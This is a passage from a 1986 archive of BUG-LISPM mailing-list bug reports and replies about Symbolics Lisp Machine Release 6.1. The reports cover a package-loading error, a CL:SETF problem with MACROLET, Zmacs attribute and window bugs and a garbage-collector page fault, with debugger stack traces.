None of the files have packages in their attribute lines because this
causes a query when loading them into Zmacs and I end up either creating
the package with the incorrect default characteristics or putting the
buffer in cl-user anyway.

I tried compiling the file on a fresh machine with nothing loaded and
got the same error when loading it in the same way.  Should new packages
use the global package as well as common-lisp-global so that they can
find PKG-FIND-PACKAGE?  The package chapter in the Reference Guide
implies that that shouldn't be necessary.  If the attribute line syntax
is Common-Lisp, why doesn't creating a package with the default
characteristics make it inherit from common-lisp-global, rather that
global?

>>Trap: The function BITSTRING::PKG-FIND-PACKAGE is undefined.
While in the function SI:*EVAL  SI:DIGESTED-LET  SI:DIGEST-INTERNAL

SI:*EVAL:  (P.C. = 105)
   Arg 0 (SI:FORM): (BITSTRING::PKG-FIND-PACKAGE #"BITSTRING")
   Arg 1 (SI:ENV): NIL
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL
   Local 3 (FUNCTION): BITSTRING::PKG-FIND-PACKAGE

SI:DIGESTED-LET:  (P.C. = 126)
   Arg 0 (SI:BODY): (SI:DIGESTED-LET (LET ((*PACKAGE* #)) (EXPORT (LIST # # # # # # # # # ...))) (((BITSTRING::PKG-FIND-PACKAGE #"BITSTRING") *PACKAGE* . #<DTP-LOCATIVE 36524255>)) NIL (EXPORT (LIST (ZL:INTERN #"BSTRING") (ZL:INTERN #"BSTRINGP") (ZL:INTERN #"MAKE-BSTRING") (ZL:INTERN #"BSREF") (ZL:INTERN #"BS-AND") (ZL:INTERN #"BS-IOR") (ZL:INTERN #"BS-XOR") (ZL:INTERN #"BS-EQV") (ZL:INTERN #"BS-NAND") ...)))
   Local 0 (SI:BODY): ((EXPORT (LIST (ZL:INTERN #"BSTRING") (ZL:INTERN #"BSTRINGP") (ZL:INTERN #"MAKE-BSTRING") (ZL:INTERN #"BSREF") (ZL:INTERN #"BS-AND") (ZL:INTERN #"BS-IOR") (ZL:INTERN #"BS-XOR") (ZL:INTERN #"BS-EQV") (ZL:INTERN #"BS-NAND") ...)))
   Arg 1 (SI:ENV): NIL

SI:DIGEST-INTERNAL:  (P.C. = 30)
   Arg 0 (SI:CAR-NEW-FORM): SI:DIGESTED-LET
   Arg 1 (SI:CDR-NEW-FORM): ((LET ((*PACKAGE* #)) (EXPORT (LIST # # # # # # # # # ...))) (((BITSTRING::PKG-FIND-PACKAGE #"BITSTRING") *PACKAGE* . #<DTP-LOCATIVE 36524255>)) NIL (EXPORT (LIST (ZL:INTERN #"BSTRING") (ZL:INTERN #"BSTRINGP") (ZL:INTERN #"MAKE-BSTRING") (ZL:INTERN #"BSREF") (ZL:INTERN #"BS-AND") (ZL:INTERN #"BS-IOR") (ZL:INTERN #"BS-XOR") (ZL:INTERN #"BS-EQV") (ZL:INTERN #"BS-NAND") ...)))
   Arg 2 (SI:ENV): NIL

LET:  (P.C. = 37)
   Arg 0 (SI:FORM): (SI:DIGESTED-LET (LET ((*PACKAGE* #)) (EXPORT (LIST # # # # # # # # # ...))) (((BITSTRING::PKG-FIND-PACKAGE #"BITSTRING") *PACKAGE* . #<DTP-LOCATIVE 36524255>)) NIL (EXPORT (LIST (ZL:INTERN #"BSTRING") (ZL:INTERN #"BSTRINGP") (ZL:INTERN #"MAKE-BSTRING") (ZL:INTERN #"BSREF") (ZL:INTERN #"BS-AND") (ZL:INTERN #"BS-IOR") (ZL:INTERN #"BS-XOR") (ZL:INTERN #"BS-EQV") (ZL:INTERN #"BS-NAND") ...)))
   Arg 1 (SI:ENV): NIL

SI:*EVAL:  (P.C. = 163)
   Arg 0 (SI:FORM): (SI:DIGESTED-LET (LET ((*PACKAGE* #)) (EXPORT (LIST # # # # # # # # # ...))) (((BITSTRING::PKG-FIND-PACKAGE #"BITSTRING") *PACKAGE* . #<DTP-LOCATIVE 36524255>)) NIL (EXPORT (LIST (ZL:INTERN #"BSTRING") (ZL:INTERN #"BSTRINGP") (ZL:INTERN #"MAKE-BSTRING") (ZL:INTERN #"BSREF") (ZL:INTERN #"BS-AND") (ZL:INTERN #"BS-IOR") (ZL:INTERN #"BS-XOR") (ZL:INTERN #"BS-EQV") (ZL:INTERN #"BS-NAND") ...)))
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

SI:LOAD-BIN-OP-FORM:  (P.C. = 4)
   Arg 0 (SI:STREAM): #<FILE-INPUT-BINARY-STREAM #"OZ:PS:<SYLPH.LINGO>BITSTRING.BIN" 30361132>

SI:BIN-LOAD-NEXT-COMMAND:  (P.C. = 24)
   Arg 0 (SI:STREAM): #<FILE-INPUT-BINARY-STREAM #"OZ:PS:<SYLPH.LINGO>BITSTRING.BIN" 30361132>

SI:BIN-LOAD-TOP-LEVEL:  (P.C. = 6)
   Arg 0 (SI:STREAM): #<FILE-INPUT-BINARY-STREAM #"OZ:PS:<SYLPH.LINGO>BITSTRING.BIN" 30361132>

Rest of stack:
(:METHOD ZWEI:MAJOR-MODE :DEFAULT :LOAD-BINARY-FILE):  (P.C. = 4)
SI:BIN-LOAD-FILE-INTERNAL:  (P.C. = 147)
FS:LOAD-STREAM:  (P.C. = 16)
ZL:LOAD:  (P.C. = 124)
LOAD:  (P.C. = 116)
REQUIRE:  (P.C. = 31)
SI:*EVAL:  (P.C. = 401)
SI:READFILE-INTERNAL:  (P.C. = 142)
FS:LOAD-STREAM:  (P.C. = 16)
ZL:LOAD:  (P.C. = 124)
LOAD:  (P.C. = 116)
SI:*EVAL:  (P.C. = 401)
(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
SI:LISP-COMMAND-LOOP:  (P.C. = 67)
SI:COMMON-LISP-TOP-LEVEL:  (P.C. = 46)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
11-Mar-86 16:20:47-EST,2548;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 11 Mar 86 16:20-EST
Received: from SNOWBIRD.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 27198; Tue 11-Mar-86 16:19:43-EST
Date: Tue, 11 Mar 86 16:19 EST
From: Carl W. Hoffman <CWH@MIT-ZERMATT.ARPA>
Subject: SETF of a MACROLET-ted macro
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860311161927.5.CWH@SNOWBIRD.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
FORTRAN 49.4, Japanese 24.1, Kanji 1.0, MUSIC 11.5,
microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), Show-Mail, on Snowbird:

Compiling the following function gives an error.  SETF is CL:SETF.  If I
change it to ZL:SETF, then it compiles fine and does the right thing.

(DEFUN CHEBYSHEV (N)
  (LET ((CHEBY (MAKE-ARRAY N)))
    (MACROLET ((CHEBY (I) `(AREF CHEBY ,I)))
      (SETF (CHEBY 0) 1))))

>>Trap: The function CHEBY is undefined.
While in the function %ARGS-INFO  CL:GET-SETF-METHOD-MULTIPLE-VALUE  LT::EXPAND-SETF
While compiling CHEBYSHEV

%ARGS-INFO:  (P.C. = 5)
   Arg 0 (FUNCTION): CHEBY

CL:GET-SETF-METHOD-MULTIPLE-VALUE:  (P.C. = 73)
   Arg 0 (LT::REFERENCE): (CHEBY 0)
   --Defaulted args:--
   Arg 1 (LT::FOR-EFFECT): NIL

LT::EXPAND-SETF:  (P.C. = 152)
   Arg 0 (LT::PAIRS): ((CHEBY 0) 1)

SETF:  (P.C. = 5)
   Arg 0 (SI:.FORM.): (SETF (CHEBY 0) 1)
   Arg 1 (SI:.ENV.): (NIL ((CHEBY (SPECIAL **))))

FUNCALL:  (P.C. = 5)
   Arg 0 (SI:FN): #<DTP-COMPILED-FUNCTION SETF 47504052>
   Rest arg (ARGS): ((SETF (CHEBY 0) 1) (NIL ((CHEBY **))))

SI:MACROEXPAND-1-INTERNAL:  (P.C. = 206)
   Arg 0 (SI:MACRO-CALL): (SETF (CHEBY 0) 1)
   Arg 1 (SI:ENV): (NIL ((CHEBY (SPECIAL **))))
   Arg 2 (SI:RUN-STYLE-CHECKERS-P): NIL
   Arg 3 (SI:DONT-EXPAND-SPECIAL-FORMS): NIL

MACROEXPAND-1:  (P.C. = 10)
   Arg 0 (SI:MACRO-CALL): (SETF (CHEBY 0) 1)
   Arg 1 (SI:ENV): (NIL ((CHEBY (SPECIAL **))))
   --Defaulted args:--
   Arg 2 (SI:DONT-EXPAND-SPECIAL-FORMS): NIL

COMPILER:TRANSFORM:  (P.C. = 551)
   Arg 0 (COMPILER:FORM): (SETF (CHEBY 0) 1)
   Arg 1 (COMPILER:DESTINATION): IGNORE
   --Defaulted args:--
   Arg 2 (COMPILER:TRANSFORM-P): T
   Arg 3 (COMPILER:OPTIMIZE-P): T

COMPILER:PHASE-1:  (P.C. = 16)
   Arg 0 (COMPILER:FORM): (SETF (CHEBY 0) 1)
   Arg 1 (COMPILER:DESTINATION): IGNORE
   --Defaulted args:--
   Arg 2 (COMPILER:DO-TRANSFORM): T
   Arg 3 (COMPILER:FORM-IS-ARGUMENT-P): NIL
11-Mar-86 20:44:26-EST,982;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 11 Mar 86 20:44-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 11 MAR 86  20:43:22 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 25553; Tue 11-Mar-86 20:43:15-EST
Date: Tue, 11 Mar 86 20:42 EST
From: Roger Hurwitz <rhhu@MIT-REAGAN.ARPA>
Subject: ZMACS File/Buffer Attributes
To: BUG-LISPM@MIT-REAGAN.ARPA
Message-ID: <860311204255.0.RHHU@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 13.4, Macsyma 310.35, Experimental RELATUS 147.28,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

Fonts can confuse the attribute list reader. (also attributes should not be
just keywords I have fixed this myself by exploiting an inchoate attribute
typing mechanism already present in zmacs.)
11-Mar-86 21:18:58-EST,1148;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 11 Mar 86 21:18-EST
Date: Tue, 11 Mar 86 21:18:06 EST
From: David Vinayak Wallace <GUMBY@MC.LCS.MIT.EDU>
Subject:  common lisp package bug
To: sylph@OZ.AI.MIT.EDU
cc: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <[MC.LCS.MIT.EDU].847640.860311.GUMBY>

    Date: Tue, 11 Mar 86 10:23 EST
    From: Sue Felshin <sylph at OZ.AI.MIT.EDU>

    The error occurred while loading the file bitstring, which has the
    following header:

    ;;; -*- Mode: LISP; Syntax: Common-lisp -*-

    None of the files have packages in their attribute lines because this
    causes a query when loading them into Zmacs and I end up either creating
    the package with the incorrect default characteristics or putting the
    buffer in cl-user anyway.

If this is really what you want use the syntax
-*- Mode: LISP; Syntax: Common-lisp; Package: (foo) -*-

specifying the packages you want to :USE as in the manual.

Of course, this won't work at all if you try to load it into a
non-lispm.   Only CADRs and decendents understand the attribute list
for anything but editor major modes.
11-Mar-86 21:44:28-EST,4079;000000000000
Received: from HILBERT.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 11 Mar 86 21:44-EST
Date: Tue, 11 Mar 86 21:43 EST
From: David J. Braunegg <DJB@OZ.AI.MIT.EDU>
Subject: SECOND PAGE FAULT
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860311214337.9.DJB@HILBERT.AI.MIT.EDU>

This is that second page fault that I mentioned.

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine David Hilbert:



>>Error: Page fault on unallocated VMA 177601515, %other-pc #<DTP-ODD-PC 22066203>, 
         %other-frame-pointer #<DTP-LOCATIVE 14700330>, %other-stack-pointer #<DTP-LOCATIVE 14700335>
While in the function SYS:TRANSPORT-TRAP  SI:SCAVENGE-PAGE  SI:SCAVENGE-ESRT

SYS:TRANSPORT-TRAP:  (P.C. = 765)
   Arg 0 (SI:OLD-INHIBIT-SCHEDULING-FLAG): T
   Arg 1 (SI:CELL): #<DTP-LOCATIVE 34132360>
   Local 2 (SI:ENTRY-TIME): -714101051
   Local 3 (SI:ENTRY-PAGE-FETCHES): 88853
   Local 4: 0
   Local 5: -234945715
   Local 6: #<DTP-ODD-PC 22066203>
   Local 7: #<DTP-COMPILED-FUNCTION SYS:WIRED-FERROR-1 2101445>
   Local 8: #<DTP-LOCATIVE 14700330>
   Local 9: #<DTP-LOCATIVE 14700336>
   Local 10: #<DTP-EVEN-PC 2100051>
   Local 11: 134218752
   Local 12 (SI:*SELECTQ-ITEM*): #<DTP-COMPILED-FUNCTION SYS:WIRED-FERROR-1 2101445>
   Local 13 (SI:N-HEADER-WORDS): SYS:UNWIND-PROTECT-TAG
   Local 14 (SI:LEADER-LENGTH): #<DTP-EVEN-PC 2101474>
   Local 15 (SI:ELEMENT-LENGTH): #<DTP-LOCATIVE 14640012>
   Local 16 (SI:ELEMENTS-PER-Q): NIL

SI:SCAVENGE-PAGE:  (P.C. = 146)
   Arg 0 (SI:ADDRESS): 7386112
   Local 0 (SI:ADDRESS): 7386352

SI:SCAVENGE-ESRT:  (P.C. = 73)
   Arg 0 (SI:WORK-UNITS): 1024
   Local 0 (SI:WORK-UNITS): 262
   Arg 1 (SI:MAX-TIME): 50000
   Local 1 (SI:MAX-TIME): 25975

SI:%GC-SCAVENGE:  (P.C. = 305)
   Arg 0 (SI:WORK-UNITS): 65536
   Local 0 (SI:WORK-UNITS): 19402
   Arg 1 (SI:MAX-TIME): NIL
   Arg 2 (CONS): T

SI:%MAKE-STACK:  (P.C. = 335)
   Arg 0 (SI:AREA): 2
   Arg 1 (SYS:SIZE): 8192
   Local 1 (SYS:SIZE): 16384
   Arg 2 (SYS:STACK-GROUP): #<STACK-GROUP GC-NEEDS-TO-BE-TURNED-ON 123447423>
   Arg 3 (SI:REP-TYPE): 0

MAKE-STACK-GROUP:  (P.C. = 221)
   Arg 0 (SI:NAME): "GC-NEEDS-TO-BE-TURNED-ON"
   Rest arg (SI:OPTIONS): (:ALLOW-UNKNOWN-KEYWORDS T :SAFE 0 :NAME "GC-NEEDS-TO-BE-TURNED-ON")

(:METHOD SI:PROCESS :INIT):  (P.C. = 15)
   Arg 0 (SELF): #<PROCESS GC-NEEDS-TO-BE-TURNED-ON 30440002>
   Arg 1 (SYS:SELF-MAPPING-TABLE): SI:PROCESS
   Arg 2 (SI:OPERATION): :INIT
   Arg 3 (SI:INIT-PLIST): #<DTP-LOCATIVE 14700112>

(:METHOD SI:PROCESS :COMBINED :INIT):  (P.C. = 10)
   Arg 0 (SELF): #<PROCESS GC-NEEDS-TO-BE-TURNED-ON 30440002>
   Arg 1 (SYS:SELF-MAPPING-TABLE): SI:PROCESS
   Arg 2 (SI:.OPERATION.): :INIT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<DTP-LOCATIVE 14700112>)

INSTANTIATE-FLAVOR:  (P.C. = 445)
   Arg 0 (SI:FLAVOR-NAME): SI:PROCESS
   Arg 1 (SI:INIT-PLIST): #<DTP-LOCATIVE 14700112>
   Arg 2 (SI:SEND-INIT-MESSAGE-P): T
   --Defaulted args:--
   Arg 3 (SI:RETURN-UNHANDLED-KEYWORDS-P): NIL
   Arg 4 (SI:AREA-TO-CONS-INSTANCE-IN): NIL

MAKE-PROCESS:  (P.C. = 32)
   Arg 0 (SI:NAME): "GC-NEEDS-TO-BE-TURNED-ON"
   Rest arg (SI:INIT-ARGS): NIL
   Local 1 (SI:INIT-ARGS): (:NAME "GC-NEEDS-TO-BE-TURNED-ON")

SI:PROCESS-RUN-FUNCTION-1:  (P.C. = 147)
   Arg 0 (SI:NAME-OR-KEYS): (:NAME "GC-NEEDS-TO-BE-TURNED-ON" :PRIORITY 5)
   Arg 1 (FUNCTION): SI:GC-NEEDS-TO-BE-TURNED-ON
   Arg 2 (ARGS): ((SI:GC-NEEDS-TO-BE-TURNED-ON SI:GC-NEEDS-TO-BE-TURNED-ON 440 -34352))
   Arg 3 (SI:LOCAL-KEYS): NIL

PROCESS-RUN-FUNCTION:  (P.C. = 7)
   Arg 0 (SI:NAME-OR-KWDS): (:NAME "GC-NEEDS-TO-BE-TURNED-ON" :PRIORITY 5)
   Arg 1 (FUNCTION): SI:GC-NEEDS-TO-BE-TURNED-ON
   Rest arg (ARGS): ((SI:GC-NEEDS-TO-BE-TURNED-ON SI:GC-NEEDS-TO-BE-TURNED-ON 440 -34352))

SI:GC-DAEMON-FUNCTION:  (P.C. = 56)

SI:PROCESS-SCHEDULER:  (P.C. = 345)
12-Mar-86 04:23:52-EST,979;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 12 Mar 86 04:23-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 12 MAR 86  04:22:40 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 25606; Wed 12-Mar-86 04:22:47-EST
Date: Wed, 12 Mar 86 04:22 EST
From: JCMA@MIT-AI.ARPA
Subject: flavor examiner
To: BUG-LISPM@MIT-REAGAN.ARPA
Message-ID: <860312042221.9.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 13.4, Macsyma 310.35, Experimental RELATUS 147.29,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

does not find methods automatically generated to access instance variables
when inherited from mixins.  This may be true of the base flavor too.  This
happes without any conditional mixins.  Rather confusing should be fixed.
12-Mar-86 09:56:33-EST,1739;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 12 Mar 86 09:56-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM ([192.10.41.45]) by MIT-ZERMATT.ARPA via INTERNET with SMTP id 27256; 12 Mar 86 09:55:56-EST
Received: from SAPSUCKER.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 4276; Wed 12-Mar-86 09:54:47-EST
Date: Wed, 12 Mar 86 09:54 EST
From: Charles Hornig <Hornig@SCRC-RIVERSIDE.ARPA>
Subject: SETF of a MACROLET-ted macro
To: Carl W. Hoffman <CWH@MIT-ZERMATT.ARPA>, BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860311161927.5.CWH@SNOWBIRD.LCS.MIT.EDU>
Message-ID: <860312095414.2.HORNIG@SAPSUCKER.SCRC.Symbolics.COM>

    Date: Tue, 11 Mar 86 16:19 EST
    From: Carl W. Hoffman <CWH@MIT-ZERMATT.ARPA>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
    FORTRAN 49.4, Japanese 24.1, Kanji 1.0, MUSIC 11.5,
    microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), Show-Mail, on Snowbird:

    Compiling the following function gives an error.  SETF is CL:SETF.  If I
    change it to ZL:SETF, then it compiles fine and does the right thing.

    (DEFUN CHEBYSHEV (N)
      (LET ((CHEBY (MAKE-ARRAY N)))
	(MACROLET ((CHEBY (I) `(AREF CHEBY ,I)))
	  (SETF (CHEBY 0) 1))))

    >>Trap: The function CHEBY is undefined.
    While in the function %ARGS-INFO  CL:GET-SETF-METHOD-MULTIPLE-VALUE  LT::EXPAND-SETF
    While compiling CHEBYSHEV

Thabnk you for this report.  The problem you describe has been fixed the
fix will be distributed in a future release.  The CL SETF stuff wasn't
respecting the lexical environment.

12-Mar-86 11:07:50-EST,3276;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 12 Mar 86 11:07-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM ([192.10.41.45]) by MIT-ZERMATT.ARPA via INTERNET with SMTP id 27266; 12 Mar 86 11:07:08-EST
Received: from NEPONSET.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 4313; Wed 12-Mar-86 11:06:00-EST
Date: Wed, 12 Mar 86 11:07 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: SETF of a MACROLET-ted macro
To: Carl W. Hoffman <CWH@MIT-ZERMATT.ARPA>, BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860311161927.5.CWH@SNOWBIRD.LCS.MIT.EDU>
Message-ID: <860312110703.0.DCP@NEPONSET.SCRC.Symbolics.COM>

    Date: Tue, 11 Mar 86 16:19 EST
    From: Carl W. Hoffman <CWH@MIT-ZERMATT.ARPA>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
    FORTRAN 49.4, Japanese 24.1, Kanji 1.0, MUSIC 11.5,
    microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), Show-Mail, on Snowbird:

    Compiling the following function gives an error.  SETF is CL:SETF.  If I
    change it to ZL:SETF, then it compiles fine and does the right thing.

This works in Release 7.  Hint: Use m-sh-M on the macrolet to see if the
macroletted macros are indeed getting expanded correctly.  I.e., you
don't need to waste time with the compiler.

    (DEFUN CHEBYSHEV (N)
      (LET ((CHEBY (MAKE-ARRAY N)))
	(MACROLET ((CHEBY (I) `(AREF CHEBY ,I)))
	  (SETF (CHEBY 0) 1))))

    >>Trap: The function CHEBY is undefined.
    While in the function %ARGS-INFO  CL:GET-SETF-METHOD-MULTIPLE-VALUE  LT::EXPAND-SETF
    While compiling CHEBYSHEV

    %ARGS-INFO:  (P.C. = 5)
       Arg 0 (FUNCTION): CHEBY

    CL:GET-SETF-METHOD-MULTIPLE-VALUE:  (P.C. = 73)
       Arg 0 (LT::REFERENCE): (CHEBY 0)
       --Defaulted args:--
       Arg 1 (LT::FOR-EFFECT): NIL

    LT::EXPAND-SETF:  (P.C. = 152)
       Arg 0 (LT::PAIRS): ((CHEBY 0) 1)

    SETF:  (P.C. = 5)
       Arg 0 (SI:.FORM.): (SETF (CHEBY 0) 1)
       Arg 1 (SI:.ENV.): (NIL ((CHEBY (SPECIAL **))))

    FUNCALL:  (P.C. = 5)
       Arg 0 (SI:FN): #<DTP-COMPILED-FUNCTION SETF 47504052>
       Rest arg (ARGS): ((SETF (CHEBY 0) 1) (NIL ((CHEBY **))))

    SI:MACROEXPAND-1-INTERNAL:  (P.C. = 206)
       Arg 0 (SI:MACRO-CALL): (SETF (CHEBY 0) 1)
       Arg 1 (SI:ENV): (NIL ((CHEBY (SPECIAL **))))
       Arg 2 (SI:RUN-STYLE-CHECKERS-P): NIL
       Arg 3 (SI:DONT-EXPAND-SPECIAL-FORMS): NIL

    MACROEXPAND-1:  (P.C. = 10)
       Arg 0 (SI:MACRO-CALL): (SETF (CHEBY 0) 1)
       Arg 1 (SI:ENV): (NIL ((CHEBY (SPECIAL **))))
       --Defaulted args:--
       Arg 2 (SI:DONT-EXPAND-SPECIAL-FORMS): NIL

    COMPILER:TRANSFORM:  (P.C. = 551)
       Arg 0 (COMPILER:FORM): (SETF (CHEBY 0) 1)
       Arg 1 (COMPILER:DESTINATION): IGNORE
       --Defaulted args:--
       Arg 2 (COMPILER:TRANSFORM-P): T
       Arg 3 (COMPILER:OPTIMIZE-P): T

    COMPILER:PHASE-1:  (P.C. = 16)
       Arg 0 (COMPILER:FORM): (SETF (CHEBY 0) 1)
       Arg 1 (COMPILER:DESTINATION): IGNORE
       --Defaulted args:--
       Arg 2 (COMPILER:DO-TRANSFORM): T
       Arg 3 (COMPILER:FORM-IS-ARGUMENT-P): NIL

12-Mar-86 11:16:03-EST,1469;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 12 Mar 86 11:15-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 12 MAR 86  11:14:50 EST
Received: from ALLEGHENY.SCRC.Symbolics.COM ([192.10.41.45]) by MIT-REAGAN.ARPA via INTERNET with SMTP id 25623; 12 Mar 86 11:14:59-EST
Received: from NEPONSET.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 4317; Wed 12-Mar-86 11:12:31-EST
Date: Wed, 12 Mar 86 11:13 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: ZMACS File/Buffer Attributes
To: Roger Hurwitz <rhhu@MIT-REAGAN.ARPA>, BUG-LISPM@MIT-REAGAN.ARPA
In-Reply-To: <860311204255.0.RHHU@MIT-MORRISON.ARPA>
Message-ID: <860312111335.2.DCP@NEPONSET.SCRC.Symbolics.COM>

    Date: Tue, 11 Mar 86 20:42 EST
    From: Roger Hurwitz <rhhu@MIT-REAGAN.ARPA>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
    AISite 13.4, Macsyma 310.35, Experimental RELATUS 147.28,
    microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

    Fonts can confuse the attribute list reader. (also attributes should not be
    just keywords I have fixed this myself by exploiting an inchoate attribute
    typing mechanism already present in zmacs.)

This set of bugs has been completely wiped out with the new character
style handling in Release 7.

13-Mar-86 07:54:49-EST,11286;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 13 Mar 86 07:54-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 13 MAR 86  07:53:16 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 25723; Thu 13-Mar-86 07:52:49-EST
Date: Thu, 13 Mar 86 07:52 EST
From: JCMA@MIT-AI.ARPA
Subject: window lossage associate with META-X Tags Search
To: BUG-LISPM@MIT-REAGAN.ARPA
Message-ID: <860313075243.8.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 13.4, Macsyma 310.35, Experimental RELATUS 147.32,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:



>>Error: The first argument (ARRAY) to ARRAY-ACTIVE-LENGTH, NIL, was of the wrong type.
         The function expected an array.
While in the function ARRAY-ACTIVE-LENGTH  (:METHOD TV:SHEET :STRING-OUT-EXPLICIT)  (:DEFUN-METHOD TV:SHEET-DISPLAY-LOZENGED-STRING-INTERNAL)

ARRAY-ACTIVE-LENGTH:  (P.C. = 123)
   Arg 0 (ARRAY): NIL
   Local 1 (SI:TEM): NIL
   Local 2 (SI:*SELECTQ-ITEM*): ARRAY

(:METHOD TV:SHEET :STRING-OUT-EXPLICIT):  (P.C. = 35)
   Arg 0 (SELF): #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TV:SHEET -- 0. IV's, 1. FL's 120111724>
   Arg 2 (SI:OPERATION): :STRING-OUT-EXPLICIT
   Arg 3 (STRING): NIL
   Arg 4 (TV:X): 191
   Arg 5 (TV:Y): 5
   Arg 6 (TV:XLIM): 210
   Arg 7 (FONT): #<FONT 5X5 144375324>
   Arg 8 (TV:ALU): 7
   --Defaulted args:--
   Arg 9 (TV:START): 0
   Arg 10 (TV:END): NIL

(:DEFUN-METHOD TV:SHEET-DISPLAY-LOZENGED-STRING-INTERNAL):  (P.C. = 54)
   Arg 0 (SELF): #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TV:SHEET -- 0. IV's, 1. FL's 120111724>
   Arg 2 (STRING): NIL
   Arg 3 (TV:X0): 186
   Arg 4 (TV:Y0): 3
   Arg 5 (TV:XLIM): 764
   Arg 6 (TV:ALUF): 7

(:DEFUN-METHOD TV:SHEET-DISPLAY-LOZENGED-STRING):  (P.C. = 46)
   Arg 0 (SELF): #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TV:SHEET -- 0. IV's, 1. FL's 120111724>
